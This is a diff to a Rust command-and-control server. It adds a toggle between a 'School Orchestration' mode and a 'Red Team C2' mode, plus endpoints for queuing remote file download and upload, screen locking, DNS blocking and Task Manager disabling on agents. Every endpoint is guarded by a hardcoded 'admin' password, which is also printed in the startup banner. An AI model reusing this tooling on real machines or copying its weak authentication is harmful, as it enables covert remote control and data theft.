@@ -46,6 +46,7 @@ struct State {
     agents: HashMap<Uuid, Agent>,
     tasks: HashMap<Uuid, TaskInfo>,
     task_queues: HashMap<Uuid, VecDeque<Uuid>>,
+    school_mode: bool,
 }
 
 impl State {
@@ -54,6 +55,7 @@ impl State {
             agents: HashMap::new(),
             tasks: HashMap::new(),
             task_queues: HashMap::new(),
+            school_mode: true,
         }
     }
 
@@ -301,6 +303,109 @@ async fn handle_request(
             json_response(tasks, StatusCode::OK)
         }
 
+        (Method::POST, "/set_mode") => {
+            #[derive(serde::Deserialize)]
+            struct SetModeRequest {
+                password: String,
+                school_mode: bool,
+            }
+
+            let request: SetModeRequest = match serde_json::from_slice(&body_bytes) {
+                Ok(data) => data,
+                Err(_) => return Ok(error_response("Invalid JSON", StatusCode::BAD_REQUEST)),
+            };
+
+            if request.password != "admin" {
+                return Ok(error_response("Unauthorized", StatusCode::UNAUTHORIZED));
+            }
+
+            let mut state = state.lock().unwrap();
+            state.school_mode = request.school_mode;
+            
+            let mode_name = if request.school_mode { "School Orchestration" } else { "Red Team C2" };
+            json_response(
+                serde_json::json!({
+                    "success": true,
+                    "mode": mode_name,
+                    "school_mode": request.school_mode
+                }),
+                StatusCode::OK,
+            )
+        }
+
+        (Method::GET, "/mode") => {
+            let state = state.lock().unwrap();
+            let mode_name = if state.school_mode { "School Orchestration" } else { "Red Team C2" };
+            json_response(
+                serde_json::json!({
+                    "school_mode": state.school_mode,
+                    "mode": mode_name
+                }),
+                StatusCode::OK,
+            )
+        }
+
+        (Method::POST, "/protocol") => {
+            let request: AddTaskRequest = match serde_json::from_slice(&body_bytes) {
+                Ok(data) => data,
+                Err(_) => return Ok(error_response("Invalid JSON", StatusCode::BAD_REQUEST)),
+            };
+
+            if request.password != "admin" {
+                return Ok(error_response("Unauthorized", StatusCode::UNAUTHORIZED));
+            }
+
+            let mut state = state.lock().unwrap();
+            
+            if !state.school_mode && !request.command.starts_with("PROTOCOL:") {
+                return Ok(error_response("Protocol commands only available in School Mode", StatusCode::FORBIDDEN));
+            }
+
+            if !state.agent_exists(request.agent_id) {
+                return Ok(error_response("Unknown agent", StatusCode::NOT_FOUND));
+            }
+
+            let task_id = state.add_task(request.agent_id, request.command);
+            json_response(
+                AddTaskResponse {
+                    task_id,
+                    message: format!("Protocol task queued for agent {}", request.agent_id),
+                },
+                StatusCode::OK,
+            )
+        }
+
+        (Method::POST, "/revert_all") => {
+            #[derive(serde::Deserialize)]
+            struct RevertRequest {
+                password: String,
+                agent_id: Uuid,
+            }
+
+            let request: RevertRequest = match serde_json::from_slice(&body_bytes) {
+                Ok(data) => data,
+                Err(_) => return Ok(error_response("Invalid JSON", StatusCode::BAD_REQUEST)),
+            };
+
+            if request.password != "admin" {
+                return Ok(error_response("Unauthorized", StatusCode::UNAUTHORIZED));
+            }
+
+            let mut state = state.lock().unwrap();
+            if !state.agent_exists(request.agent_id) {
+                return Ok(error_response("Unknown agent", StatusCode::NOT_FOUND));
+            }
+
+            let task_id = state.add_task(request.agent_id, "PROTOCOL:REVERT_ALL".to_string());
+            json_response(
+                AddTaskResponse {
+                    task_id,
+                    message: format!("Revert command queued for agent {}", request.agent_id),
+                },
+                StatusCode::OK,
+            )
+        }
+
         _ => error_response("Not Found", StatusCode::NOT_FOUND),
     };
 
@@ -320,8 +425,29 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     println!("    GET    /agents                    - List all agents");
     println!("    GET    /tasks/<task_id>           - Get task details and result");
     println!("    GET    /agent/<agent_id>/tasks    - List all tasks for agent");
+    println!("    GET    /mode                      - Get current server mode");
+    println!("    POST   /set_mode                  - Switch between School/C2 mode");
+    println!("    POST   /protocol                  - Execute protocol command (School mode)");
+    println!("    POST   /revert_all                - Revert all changes on agent");
+    println!();
+    println!("[*] Available Protocols (School Mode):");
+    println!("    PROTOCOL:QUIZ_MODE|<url>          - Lock to quiz webpage");
+    println!("    PROTOCOL:BLOCK_DNS                - Block all DNS");
+    println!("    PROTOCOL:BLOCK_DNS_WHITELIST|<domains> - Whitelist specific domains");
+    println!("    PROTOCOL:GET_FILE|<path>          - Download file from agent");
+    println!("    PROTOCOL:UPLOAD_FILE|<path>|<base64> - Upload file to agent");
+    println!("    PROTOCOL:LOCK_SCREEN              - Lock the workstation");
+    println!("    PROTOCOL:DISABLE_TASK_MANAGER     - Disable Task Manager");
+    println!("    PROTOCOL:ENABLE_TASK_MANAGER      - Enable Task Manager");
+    println!("    PROTOCOL:REVERT_ALL               - Restore all settings");
     
     let state = Arc::new(Mutex::new(State::new()));
+
+    let mode = state.lock().unwrap().school_mode;
+    let mode_name = if mode { "School Orchestration Mode" } else { "Red Team C2 Mode" };
+    println!("[*] Server mode: {}", mode_name);
+    println!("[*] Change mode with: POST /set_mode {{\"password\":\"admin\", \"school_mode\": true/false}}");
+    println!();
 
     loop {
         let state = Arc::clone(&state);
